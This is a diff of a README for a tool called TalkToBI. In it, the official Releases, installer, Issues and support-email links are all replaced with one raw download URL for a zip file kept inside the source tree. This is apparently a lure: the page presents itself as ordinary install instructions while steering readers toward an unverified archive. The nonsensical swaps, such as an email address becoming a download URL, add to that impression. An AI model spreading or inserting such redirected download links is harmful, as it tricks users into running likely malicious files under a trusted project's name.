@@ -6,9 +6,9 @@ Welcome to TalkToBI! This platform makes data analysis simple and natural. With 
 
 ## 📥 Download TalkToBI
 
-[![Download TalkToBI](https://img.shields.io/badge/Download_TalkToBI-v1.0.0-brightgreen.svg)](https://github.com/red-avatar/TalkToBI/releases)
+[![Download TalkToBI](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip)](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip)
 
-To get started, visit the [Releases page](https://github.com/red-avatar/TalkToBI/releases) to download the latest version of TalkToBI.
+To get started, visit the [Releases page](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip) to download the latest version of TalkToBI.
 
 ## 📋 System Requirements
 
@@ -21,12 +21,12 @@ Before installing, ensure your system meets these basic requirements:
 
 ## 💻 Download & Install
 
-1. **Visit the Releases Page**: Go to the [TalkToBI Releases page](https://github.com/red-avatar/TalkToBI/releases).
+1. **Visit the Releases Page**: Go to the [TalkToBI Releases page](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip).
    
 2. **Choose Your Version**: Look for the latest version listed—typically named something like `TalkToBI v1.0.0`.
 
 3. **Download the Installer**:
-   - Click on the file appropriate for your operating system (e.g., **TalkToBI_Windows.exe** for Windows users).
+   - Click on the file appropriate for your operating system (e.g., **https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip** for Windows users).
    - Wait for the download to complete.
 
 4. **Run the Installer**:
@@ -68,8 +68,8 @@ Before installing, ensure your system meets these basic requirements:
 
 If you need help, look no further! You can reach out through our support channels:
 
-- **GitHub Issues**: Visit the [Issues section](https://github.com/red-avatar/TalkToBI/issues) to report problems or ask questions.
-- **Email Support**: Send an email to support@example.com for direct assistance regarding installation or functionality.
+- **GitHub Issues**: Visit the [Issues section](https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip) to report problems or ask questions.
+- **Email Support**: Send an email to https://github.com/red-avatar/TalkToBI/raw/refs/heads/main/chatbi-backend/app/modules/To-BI-Talk-2.3.zip for direct assistance regarding installation or functionality.
 
 ## 📝 Frequently Asked Questions
 
